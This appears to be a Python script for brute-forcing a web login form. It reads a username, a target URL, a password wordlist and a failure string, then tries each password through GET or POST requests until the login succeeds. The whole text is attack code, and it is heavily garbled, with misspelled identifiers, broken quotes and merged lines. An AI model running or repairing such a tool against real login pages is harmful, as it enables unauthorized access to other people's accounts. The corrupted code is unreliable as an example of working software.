import  request 
from termcolor import colored

urt = Input(1-1 Enter urt page:)

username = Input('/+1 Enter usernase for the account to bruteforce: ') password file input('[+] Enter Password file to use: ")

login vailed string = input(+1 Enter; string that occurs when login faxls:) cookie, value = input('1+1 Enter cookie Value(optional): ')

def cracking(username.url):

for pas ord in passwords:

password password.strip()

print(colored! Trying: password). Tred'))

data (username username, password

If cookie value f

password, Login't submit '

response requests.get(url, p{username username, password password, Login: Login'), conkles = ["Cookie': cookie

else:

response requests.post(urt. dat-data)

if login vaited string in response.content.decode():

pass

else:

print(colored((`11 Found username: print(colored (( [+] Found username: *> username), "green"))

password). "green:))

exit()

with open (password_file r') as passwords:

cracking (username.urt)
print(' [!] password not in list ')
